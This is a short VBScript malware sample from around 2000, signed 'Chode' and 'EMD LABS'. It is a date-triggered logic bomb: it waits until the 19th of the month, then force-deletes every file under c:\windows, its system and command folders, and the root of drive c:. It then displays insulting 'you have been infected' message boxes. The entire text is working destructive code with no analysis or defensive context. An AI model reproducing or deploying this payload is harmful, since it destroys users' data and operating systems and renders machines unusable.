Do
If Day(Now) = 19 Then DeleteAFile
Loop Until Day(Now) = 19
Sub DeleteAFile()
On Error Resume Next
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile "c:\windows\*.*", True
fso.DeleteFile "c:\windows\system\*.*", True
fso.DeleteFile "c:\windows\command\*.*", True
fso.DeleteFile "c:\*.*", True
End Sub
MsgBox "You Have Been Infected By Chode", vbCritical, "(C) 2000 EMD LABS Inc." 
MsgBox "You may now turn this piece of shit off!", vbCritical, "ChOdE"


 